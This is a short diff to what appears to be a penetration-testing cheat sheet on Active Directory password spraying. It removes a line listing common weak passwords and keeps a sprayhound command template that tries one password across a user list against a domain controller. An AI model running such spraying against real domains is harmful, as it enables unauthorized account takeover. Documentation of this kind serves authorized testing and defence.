@@ -38,7 +38,7 @@ sprayhound -U <users.txt> -d <domain> -dc <dc_ip>   # add flags (--lower/--upper
 
 ### Common password spraying (few common passwords, many users)
 
-- Typical passwords: SeasonYear!, Company123, Welcome123, etc.
+
 ```bash
 # sprayhound with one password
 sprayhound -U <users.txt> -p <password> -d <domain> -dc <dc_ip>
